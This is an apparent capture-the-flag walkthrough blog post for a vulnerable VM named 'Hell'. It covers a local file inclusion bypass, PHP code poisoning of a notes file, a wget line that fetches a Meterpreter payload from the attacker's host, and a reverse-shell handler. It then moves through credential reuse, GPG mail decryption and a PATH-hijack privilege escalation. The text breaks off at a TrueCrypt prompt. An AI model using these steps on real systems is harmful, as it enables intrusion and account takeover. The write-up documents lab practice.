<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_015.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_015.png" alt="hell_015" /></a></p>

<p>On further investigation, the <strong>intruder</strong> attribute of the cookie is set which defines the file that is included at the top of the panel. I wonder if there&rsquo;s a local file inclusion vulnerability there.  I went about editing the cookie to try and include other files on the filesystem.  After a few minutes of frustration, I worked out that the code was filtering any instance of ../ in the include path - however, being the sneaky person I am, I discovered this can be bypassed by using &hellip;.// or &hellip;/./ instead.  Here&rsquo;s /etc/passwd included by setting the <strong>intruder</strong> cookie attribute to &hellip;.//&hellip;.//&hellip;.//&hellip;.//etc/passwd</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_008.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_008.png" alt="hell_008" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_010.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_010.png" alt="" /></a></p>

<p>It looks like the page parses any code (HTML etc) in the included file, therefore we can poison the note.txt file with PHP via the Notes feature, and include it to execute the code.  First, a PHP based reverse staged Meterpreter is created and hosted on an HTTP server.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# msfpayload php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.110 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> R &gt; sneaky.txt
</span></code></pre></td></tr></table></div></figure>


<p>As we are using a staged payload, a handler is required, therefore one is set up via Metasploit</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf &gt; use multi/handler
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>payload php/meterpreter/reverse_tcp
</span><span class='line'><span class="nv">payload</span> <span class="o">=</span>&gt; php/meterpreter/reverse_tcp
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lport 443
</span><span class='line'><span class="nv">lport</span> <span class="o">=</span>&gt; 443
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lhost 192.168.0.110
</span><span class='line'><span class="nv">lhost</span> <span class="o">=</span>&gt; 192.168.0.110
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; run
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse handler on 192.168.0.110:443
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting the payload handler...
</span></code></pre></td></tr></table></div></figure>


<p>Once the failed login cookie is cleared to allow us to get to features again, the following is added to the note.txt file via the Notes feature, which will download our payload from our HTTP server to the /tmp folder on the host</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;?php <span class="nb">echo </span>shell_exec<span class="o">(</span><span class="s1">&#39;wget http://192.168.0.110/sneaky.txt -O /tmp/sneaky.txt 2&gt;&amp;1&#39;</span><span class="o">)</span><span class="p">;</span>?&gt;
</span></code></pre></td></tr></table></div></figure>


<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png" alt="hell_011" /></a></p>

<p>Three failed logins are once again performed via the Personal feature to create the cookie, which is modified to include /tmp/note.txt (which includes our download PHP command)</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_012.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_012.png" alt="hell_012" /></a></p>

<p>When the main panel page is reloaded, our poisoned note.txt file is included, the PHP is parsed and our payload file is downloaded.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_013.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_013.png" alt="hell_013" /></a></p>

<p>We&rsquo;re onto something here !  The cookie is edited once again to include /tmp/sneaky.txt and the panel page reloaded to execute stage 1 of our Meterpreter payload, which makes a connection to our waiting handler.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png" alt="hell_014" /></a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">40551</span> bytes<span class="o">)</span> to 192.168.0.103
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>192.168.0.110:443 -&gt; 192.168.0.103:48153<span class="o">)</span> at 2014-07-17 21:55:37 +0100
</span><span class='line'>
</span><span class='line'>meterpreter &gt;
</span></code></pre></td></tr></table></div></figure>


<p>Now would be a good time for a party, but there&rsquo;s hacking to do.  Plus I have no cake or balloons.  Or friends. <em><em>whimper</em></em> &hellip; HACKING !!!</p>

<p>The Metepreter session can be used to get a shell, which doesn&rsquo;t seem to be TTY, but we can fix that with a nifty command thanks to <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmi1k</a> himself (who is presumably hiding from Jack, the creepy so-and-so). The id command shows that we are currently under the context of the www-data user.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>meterpreter &gt; shell
</span><span class='line'>Process <span class="m">10279</span> created.
</span><span class='line'>Channel <span class="m">0</span> created.
</span><span class='line'>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>BAM ! We&rsquo;ve just started the journey.</p>

<p>Catting /etc/passwd gives us a list of users that are potentially useful</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cat /etc/passwd
</span><span class='line'>cat /etc/passwd
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>george:x:1000:1000:george,,,:/home/george:/bin/bash
</span><span class='line'>jack:x:1001:1001::/home/jack:/bin/sh
</span><span class='line'>milk_4_life:x:1002:1002::/home/milk_4_life:/bin/sh
</span><span class='line'>developers:x:1003:1003::/home/developers:/bin/sh
</span><span class='line'>bazza:x:1004:1004::/home/bazza:/bin/sh
</span><span class='line'>oj:x:1005:1005::/home/oj:/bin/sh
</span></code></pre></td></tr></table></div></figure>


<hr />

<h2>Imagine Jack and Jill, But With Half the Cast Replaced with a Cardboard Cutout of g0tmi1k</h2>

<p>Escalating from the www-data user to the jack user is pretty inconsequential. People who write web sites, especially disturbing ones such as this, will usually not bother to create separate accounts for things such as database logins.</p>

<p>A quick grep on the files in /super_secret_login_path_muhahaha/ for the word &ldquo;password&rdquo; results in the following</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>grep password /var/www/super_secret_login_path_muhahaha/*
</span><span class='line'>index.php:&lt;INPUT <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;password&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;password&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;password&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span>/&gt;
</span><span class='line'>login.php:    <span class="nv">$password</span> <span class="o">=</span> mysql_escape_string<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s2">&quot;password&quot;</span><span class="o">])</span><span class="p">;</span>
</span><span class='line'>login.php:    // mysql_connect<span class="o">(</span><span class="s2">&quot;127.0.0.1&quot;</span>, <span class="s2">&quot;Jack&quot;</span>, <span class="s2">&quot;zgcR6mU6pX&quot;</span><span class="o">)</span> or die <span class="o">(</span><span class="s2">&quot;Server Error&quot;</span><span class="o">)</span><span class="p">;</span> I<span class="s1">&#39;ll change this back once development is done. Got sick of typing my password.</span>
</span><span class='line'><span class="s1">login.php:   $sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#39;</span><span class="nv">$username</span><span class="s1">&#39; and password=&#39;</span><span class="nv">$password</span><span class="err">&#39;</span><span class="s2">&quot;;</span>
</span><span class='line'><span class="s2">personal.php:&lt;INPUT name=&quot;</span>password<span class="s2">&quot; id=&quot;</span>password<span class="s2">&quot; type=&quot;</span>password<span class="s2">&quot; value=&quot;</span><span class="err">&quot;</span>/&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Oooh, what do I spy with my little eye ? Could that be Jack&rsquo;s password commented out in login.php ? Let us try this password&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>su jack
</span><span class='line'>Password: zgcR6mU6pX
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>jack
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Well, that was easy. But then the 2nd hurdle usually is - you kinda get cocky after clearing the first one, that the second one is jumped based on pure thrill. Now we get to trip over on every hurdle between us and the finish line. Get the first aid kit ready, we&rsquo;re going to need it.</p>

<hr />

<h2>Got Milk ? Want Any ?</h2>

<p>Poking around Jack&rsquo;s home folder is like walking into a public toilet while bursting for a wee - you don&rsquo;t really want to touch anything, but have to else you&rsquo;re going to have problems.</p>

<p>The first thing that draws my eye is the g0tmi1k_pics folder. It&rsquo;s somewhere you know you don&rsquo;t want to go, but seems to have this strange come-hither vibe about it. It&rsquo;s like a car crash&hellip; gruesome but you can&rsquo;t help but look. So I did. Now I wish I didn&rsquo;t. Exhibit A, and B, and C.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/1.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/1.jpg" alt="1" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/2.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/2.jpg" alt="2" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/3.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/3.jpg" alt="3" /></a></p>

<p>Yeah&hellip;
Jack, you&rsquo;re a strange one, I&rsquo;ll give you that. Hang on, I think I can hear the men in white coats knocking. Yup, they&rsquo;re asking for you - shall I tell them you&rsquo;re &ldquo;out&rdquo; ?</p>

<p>So, while Jack might reuse passwords, he&rsquo;s sensible enough to use PGP when sending emails. /var/mail/jack/received contains an email, which is encrypted.</p>

<p>[plain]
&mdash;&ndash;BEGIN PGP MESSAGE&mdash;&ndash;
Version: BCPG C# v1.6.1.0</p>

<p>hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ
MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug==
=svWU
&mdash;&ndash;END PGP MESSAGE&mdash;&ndash;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>As suspected, Jack uses PGP on the <span class="nb">local </span>host, therefore his PGP keys are stored in /home/jack/.pgp, <span class="nb">complete </span>with a note giving us a password hint.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>$ ls -l .pgp
ls -l .pgp
total 12
-rwx&mdash;&mdash; 1 jack jack   39 Jun 18 12:35 note
-rwx&mdash;&mdash; 1 jack jack 1802 Jun 18 12:20 pgp.priv
-rwx&mdash;&mdash; 1 jack jack  890 Jun 18 12:24 pgp.pub
$ cat .pgp/note
The usual password as with everything.
$</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>We can assume the password is either **g0tmi1k69** or **zgcR6mU6pX**. GPG is installed, so the next logical step is to try and decrypt the email using either of these two passwords and Jack<span class="err">&#39;</span>s PGP private key.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>$ gpg &ndash;import .pgp/pgp.priv
gpg: key 3F18AB0A: secret key imported
gpg: /home/jack/.gnupg/trustdb.gpg: trustdb created
gpg: key 3F18AB0A: public key &ldquo;<a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#106;&#97;&#99;&#x6b;&#x40;&#x63;&#x6f;&#x77;&#x6c;&#111;&#118;&#x65;&#x72;&#115;&#x2e;&#x63;&#x6f;&#x6d;">&#106;&#97;&#x63;&#107;&#64;&#x63;&#111;&#x77;&#108;&#x6f;&#x76;&#x65;&#x72;&#x73;&#x2e;&#x63;&#111;&#109;</a>&rdquo; imported
gpg: Total number processed: 1
gpg:               imported: 1  (RSA: 1)
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
$ gpg -o email.txt /var/mail/jack/received/message.eml</p>

<p>You need a passphrase to unlock the secret key for
user: &ldquo;<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#106;&#x61;&#x63;&#x6b;&#64;&#99;&#x6f;&#119;&#x6c;&#x6f;&#x76;&#101;&#x72;&#115;&#46;&#x63;&#x6f;&#x6d;">&#106;&#x61;&#99;&#x6b;&#x40;&#x63;&#x6f;&#x77;&#x6c;&#x6f;&#118;&#x65;&#x72;&#115;&#46;&#99;&#x6f;&#109;</a>&rdquo;</p>

<p>2048-bit RSA key, ID 3F18AB0A, created 2014-06-18</p>

<p>Enter passphrase: g0tmi1k69
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
      &ldquo;<a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#58;&#x6a;&#97;&#x63;&#107;&#64;&#99;&#111;&#x77;&#x6c;&#x6f;&#118;&#101;&#x72;&#115;&#x2e;&#99;&#111;&#109;">&#x6a;&#97;&#x63;&#x6b;&#x40;&#x63;&#111;&#x77;&#108;&#111;&#x76;&#101;&#114;&#x73;&#x2e;&#x63;&#x6f;&#x6d;</a>&rdquo;
gpg: WARNING: message was not integrity protected
$ cat email.txt
Ok Jack. I&rsquo;ve created the account &lsquo;milk_4_life&rsquo; as per your request. Please stop emailing me about this now or I&rsquo;m going to talk to HR like we discussed.</p>

<p>The password is &lsquo;4J0WWvL5nS&rsquo;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Thank you, Jack, <span class="k">for</span> being a predictable - yet persistent - weirdo. A quick hop and a skip over to the worryingly named milk_4_life account and we can carry on.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>$ su milk_4_life
Password: 4J0WWvL5nS</p>

<p>$ whoami
milk_4_life
$</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>* * *
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c">## I Want to Play a Game, But No Jigsaws, OK ?!</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>The home folder <span class="k">for</span> milk_4_life is pretty sparse, just a binary called <span class="s2">&quot;game&quot;</span>. However, it<span class="err">&#39;</span>s owned by the george user, and has the suid attribute set.
</span></code></pre></td></tr></table></div></figure>


<p> bash
$ ls -l
total 20
&mdash;s&ndash;x&ndash;x 1 george      george      5743 Jun 19 18:24 game</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Running the binary produces the following output, which doesn<span class="s1">&#39;t tell us much other than it&#39;</span>s <span class="s2">&quot;listening&quot;</span>. Like a overly intrusive neighbour.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>$ ./game
I&rsquo;m listening</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Netstat isn<span class="err">&#39;</span>t available on this VM, so we have to find another way to obtain listening port information. Thankfully ss saves the day and shows the game binary IS actually listening, on port <span class="m">1337</span> - h4x !
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>$ ss -lp
State       Recv-Q Send-Q    Local Address:Port    Peer Address:Port
LISTEN      0      50        127.0.0.1:mysql       <em>:</em>
LISTEN      0      128       :::sunrpc             :::<em>
LISTEN      0      128       </em>:sunrpc              <em>:</em>
LISTEN      0      128       :::http               :::<em>
LISTEN      0      128       :::38035              :::</em>
LISTEN      0      128       <em>:35380               </em>:<em>
LISTEN      0      128       :::ssh                :::</em>
LISTEN      0      128       <em>:ssh                 </em>:<em>
LISTEN      0      10        </em>:1337                <em>:</em>
LISTEN      0      20        ::1:smtp              :::<em>
LISTEN      0      20        127.0.0.1:smtp        </em>:<em>
LISTEN      0      10        </em>:666                 <em>:</em></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Connecting to the port from another session asks us to <span class="nb">type</span> <span class="s2">&quot;START&quot;</span> to begin. It<span class="err">&#39;</span>s more fun to troll the code, though, by typing something completely different. Did you expect anything less of me ?
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>$ telnet 127.0.0.1 1337
Trying 127.0.0.1&hellip;
Connected to 127.0.0.1.
Escape character is &lsquo;^]&rsquo;.
Type &lsquo;START&rsquo; to begin</p>

<p>banana
No&hellip; START. S-T-A-R-T</p>

<p>Connection closed by foreign host.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>OK, enough messing around, <span class="nb">let</span><span class="s1">&#39;s see what this game does. Typing START presents us with a high score, and then math questions that only your high school math teacher would ask you infront of the rest of the class. Needless to say I&#39;</span>m not answering any of these correctly !
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>$ telnet 127.0.0.1 1337
Trying 127.0.0.1&hellip;
Connected to 127.0.0.1.
Escape character is &lsquo;^]&rsquo;.
Type &lsquo;START&rsquo; to begin</p>

<p>START
Starting&hellip;</p>

<p>You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)</p>

<p>Quick what&rsquo;s&hellip; 924 x 541? Umm
Quick what&rsquo;s&hellip; 982 x 21? No idea
Quick what&rsquo;s&hellip; 194 x 542? Really ?
Quick what&rsquo;s&hellip; 679 x 733? WHY WOULD I NEED TO KNOW THIS !?
Quick what&rsquo;s&hellip; 960 x 248? I give up.
Quick what&rsquo;s&hellip; 718 x 646? THANKS OBAMA !
Quick what&rsquo;s&hellip; 162 x 784? ^C
Connection closed by foreign host</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Being the competitive person I am, I figured it would be fun to try and beat the score. More than <span class="m">133723</span> points in <span class="m">30</span> seconds means I have to answer <span class="m">4457</span> correct answers a second. I can <span class="nb">type </span>quickly, but not that quickly. This requires some scripting - Python to the rescue ! This script connects to the game, reads the question, splits it based on <span class="s2">&quot; x &quot;</span> to get both numbers, performs the multiplication and sends the answer back. Granted I had some <span class="nb">help </span>on with this code - thanks c0ne !
</span></code></pre></td></tr></table></div></figure>


<p> python</p>

<h1>!/usr/bin/python</h1>

<p>import socket
import re</p>

<p>s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((&lsquo;127.0.0.1&rsquo;,1337)) # hardcoded IP address
s.recv(1024)
s.send(&lsquo;START\n&rsquo;) # login procedure
s.recv(110)
while True:
    d = s.recv(200)
    l = re.findall(r&#8221;Quick what&rsquo;s&hellip; (.*?)\?&ldquo;, d)
    if not l:
        print d
        break
    (a,b) = l[0].split(&lsquo; x &rsquo;)
    mul = int(a) * int(b)
    print str(mul)
    s.send(str(mul)+&lsquo;\n&rsquo;)</p>

<p>print s.recv(1024)
s.close()</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Running it produces a sense of authority over our robot overlords - I<span class="err">&#39;</span>m gaming the game.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>$ python gamey3.py
125451
150858
498300
493353
60564
<strong><strong> SNIP </strong></strong>
174386
841312
53636
Final Score: 412619</p>

<p>!<em>!</em>!<em>!</em>! Congratulations, new high score (412619) !<em>!</em>!<em>!</em>!</p>

<p>I hear the faint sound of chmodding&hellip;&hellip;.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>!<span class="o">[</span>high_score_320x320<span class="o">](</span>http://fourfourfourfour.co/wp-content/uploads/2014/07/high_score_320x320.png<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>It seems that the binary performs an action when the highscore is beaten. I<span class="s1">&#39;m not sure what it chmods, but I wonder if we can play this game at it&#39;</span>s own game and make it run a bogus binary. There<span class="err">&#39;</span>s a distinct possibility the code is relying on the PATH environment variable and just calling system<span class="o">(</span><span class="s2">&quot;chmod file&quot;</span><span class="o">)</span> rather than using an absolute path.
</span><span class='line'>
</span><span class='line'>So, a bogus chmod binary is created using the following <span class="nb">source</span>, compiled, placed in /tmp on the VM and made executable <span class="o">(</span><span class="k">do</span> I need to show you how to <span class="k">do</span> this ? No ? Good. Saves me the typing.<span class="o">)</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>c<span class="o">]</span><span class="c">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="c">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="c">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="c">#include &lt;unistd.h&gt;</span>
</span><span class='line'>int main<span class="o">()</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'> setuid<span class="o">(</span> <span class="m">1000</span> <span class="o">)</span><span class="p">;</span>
</span><span class='line'> system<span class="o">(</span><span class="s2">&quot;id&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'> system<span class="o">(</span> <span class="s2">&quot;/bin/sh -i&quot;</span> <span class="o">)</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The path environment variable is modified to make /tmp the first location checked</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">export</span> <span class="p">|</span> grep PATH
</span><span class='line'><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="s1">&#39;/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, hopefully, if all goes to plan, when we beat the score it should run our fake chmod binary and drop us to a shell. How about we give it a go ? The game is started, and the Python script is run to beat the score (I&rsquo;m not going to show you again, just scroll up if you want to see what it looks like).</p>

<p>The score is beaten and we are indeed dropped to a new shell as the george user.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./game
</span><span class='line'>I<span class="err">&#39;</span>m listening
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>milk_4_life<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>milk_4_life<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1000<span class="o">(</span>george<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>george<span class="o">)</span>,1002<span class="o">(</span>milk_4_life<span class="o">)</span>
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://31.media.tumblr.com/tumblr_lwipupOVfN1qh59n0o1_500.gif" alt="" /></p>

<hr />

<h2>Tales from the Crypt, But First I&rsquo;ll Rock You</h2>

<p>George has one file in his home folder - a Truecrypt container.  I guess no one has told George that TrueCrypt isn&rsquo;t recommended any more - he should be using something else.  <em>shakes fist at the NSA</em></p>

<!-- more -->


<p>Mounting the TrueCrypt container requires us to know the container password, which we currently don&rsquo;t have.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>george@hell:~<span class="nv">$ </span>truecrypt --mount container.tc
</span><span class='line'>Enter mount directory <span class="o">[</span>default<span class="o">]</span>:
</span><span class='line'>Enter password <span class="k">for</span> /home/george/container.tc:
